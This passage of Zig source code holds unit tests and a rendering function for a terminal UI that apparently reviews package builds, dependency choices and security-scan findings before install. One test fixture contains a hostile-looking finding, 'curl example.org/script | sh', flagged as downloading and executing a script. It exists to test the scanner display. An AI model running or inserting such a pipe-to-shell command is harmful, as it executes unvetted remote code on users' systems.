    try std.testing.expect(std.mem.indexOf(u8, text, "source=") == null);
    for (document.rows) |item| try std.testing.expectEqual(@as(usize, 0), item.prefix);
    vxfw.DrawContext.init(.unicode);
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    for (document.rows, 0..) |_, index| {
        const surface = try row(&document, index).?.draw(.{ .arena = arena.allocator(), .min = .{ .width = 24 }, .max = .{}, .cell_size = .{ .width = 10, .height = 20 } });
        try std.testing.expectEqual(@as(u16, 24), surface.size.width);
    }
}

test "dependency choices preserve answer indices without source line numbers" {
    var options = [_]operation.Option{
        .{ .index = 0, .name = "check-docs", .description = "Documentation", .is_installed = false, .is_selected = false },
        .{ .index = 7, .name = "provider", .description = "", .is_installed = true, .is_selected = true },
    };
    const questions = [_]operation.Question{
        .{ .select_many = .{ .question_id = "optional", .prompt = "Select optional dependencies", .options = &options } },
        .{ .select_one = .{ .question_id = "provider", .prompt = "Select a provider", .options = &options } },
    };
    for (questions) |question| {
        var document = try Document.fromQuestionForAction(std.testing.allocator, question, .upgrade);
        defer document.deinit();
        const text = try std.mem.join(std.testing.allocator, "\n", document.lines);
        defer std.testing.allocator.free(text);
        try std.testing.expect(std.mem.indexOf(u8, text, "0: check-docs\n  Documentation") != null);
        try std.testing.expect(std.mem.indexOf(u8, text, "7: provider [installed] [selected]") != null);
        for (document.rows) |item| try std.testing.expectEqual(@as(usize, 0), item.prefix);
    }
}

pub fn drawChoice(ptr: *anyopaque, ctx: vxfw.DrawContext) Allocator.Error!vxfw.Surface {
    const option: *const operation.Option = @ptrCast(@alignCast(ptr));
    const width = ctx.max.width orelse ctx.min.width;
    const spans = try ctx.arena.alloc(vxfw.RichText.TextSpan, 2);
    spans[0] = .{ .text = try std.fmt.allocPrint(ctx.arena, "[{s}] {d}: {f}{s}", .{ if (option.is_selected) "x" else " ", option.index, @import("diagnostics").safe(option.name), if (option.is_installed) " [installed]" else "" }), .style = .{ .bold = true } };
    spans[1] = .{ .text = if (option.description.len > 0) try std.fmt.allocPrint(ctx.arena, "\n    {f}", .{@import("diagnostics").safe(option.description)}) else "", .style = styles.secondary };
    const rich = try ctx.arena.create(vxfw.RichText);
    rich.* = .{ .text = spans, .softwrap = true };
    return rich.draw(ctx.withConstraints(.{ .width = width }, .{ .width = width, .height = null }));
}

test "install review presents owned colored scan findings before source and keeps attachments" {
    var message = try operation.decodeJson(std.testing.allocator,
        \\{"$kind":"q.pkgbuilddiff","QuestionId":"301","PackageName":"demo","OldPkgbuild":"","NewPkgbuild":"pkgname=demo","Warnings":[{"Tool":"script-scan","Severity":"Critical","Hook":"post_install","Message":"Downloads and executes a script","MatchedLine":"curl example.org/script | sh"},{"Tool":"homograph","Severity":"Warning","Hook":"build","Message":"Confusable character","MatchedLine":"printf \u001b[31m"}],"SourceFiles":{"demo.install":"post_install() { echo review; }"}}
    );
    var document = try Document.fromQuestionForAction(std.testing.allocator, message.value.question, .install);
    defer document.deinit();
    message.deinit(); // The review document owns every displayed field.
    try std.testing.expectEqualStrings("Security scan: 2 findings, 1 critical.", document.lines[0]);
    try std.testing.expectEqual(@as(u8, 1), document.rows[0].spans[0].style.fg.index);
    const text = try std.mem.join(std.testing.allocator, "\n", document.lines);
    defer std.testing.allocator.free(text);
    const finding = std.mem.indexOf(u8, text, "Downloads and executes a script").?;
    const source = std.mem.indexOf(u8, text, "pkgname=demo").?;
    try std.testing.expect(finding < source);
    try std.testing.expect(std.mem.indexOf(u8, text, "Matched: curl example.org/script | sh") != null);
    try std.testing.expect(std.mem.indexOf(u8, text, "demo.install") != null);
    try std.testing.expect(std.mem.indexOf(u8, text, "\\x1b[31m") != null);
    try std.testing.expect(std.mem.indexOfScalar(u8, text, 0x1b) == null);
    var critical = false;
    var warning = false;
    for (document.lines, document.rows) |line, item| {
        if (std.mem.startsWith(u8, line, "[Critical] script-scan")) critical = item.spans[0].style.fg.index == 1;
        if (std.mem.startsWith(u8, line, "[Warning] homograph")) warning = item.spans[0].style.fg.index == 3;
    }
    try std.testing.expect(critical and warning);
    vxfw.DrawContext.init(.unicode);
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const surface = try row(&document, 0).?.draw(.{ .arena = arena.allocator(), .min = .{ .width = 24 }, .max = .{}, .cell_size = .{ .width = 10, .height = 20 } });
    try std.testing.expect(surface.size.height > 1);
    try std.testing.expectEqual(@as(u8, 1), surface.buffer[24].style.fg.index);
}

test "review distinguishes no findings from unavailable scans without adding scan status to previews" {
    var question: operation.Question = .{ .pkgbuild = .{ .question_id = "1", .package_name = "demo", .old_pkgbuild = "", .new_pkgbuild = "pkgname=demo", .scan_reported = true } };
    var clean = try Document.fromQuestionForAction(std.testing.allocator, question, .install);
    defer clean.deinit();
    try std.testing.expectEqualStrings("Security scan: no findings reported by the CLI.", clean.lines[0]);
    question.pkgbuild.scan_reported = false;
    var missing = try Document.fromQuestionForAction(std.testing.allocator, question, .install);
    defer missing.deinit();
    try std.testing.expectEqualStrings("Security scan: results not supplied by the CLI.", missing.lines[0]);
    for ([_][]const u8{ "Info", "Unrecognized" }, [_]u8{ 6, 3 }) |severity, color| {
        const warnings = [_]operation.Warning{.{ .Severity = severity, .Message = "Preserve this finding" }};
        question.pkgbuild.warnings = &warnings;
        var findings = try Document.fromQuestionForAction(std.testing.allocator, question, .install);
        defer findings.deinit();
        try std.testing.expectEqual(color, findings.rows[0].spans[0].style.fg.index);
    }
    var preview = try Document.init(std.testing.allocator, &.{.{ .Name = "demo", .PkgBuild = "pkgname=demo" }});
    defer preview.deinit();
    try std.testing.expectEqual(@as(usize, 1), preview.lines.len);
    try std.testing.expect(std.mem.startsWith(u8, preview.lines[0], "    1"));
}
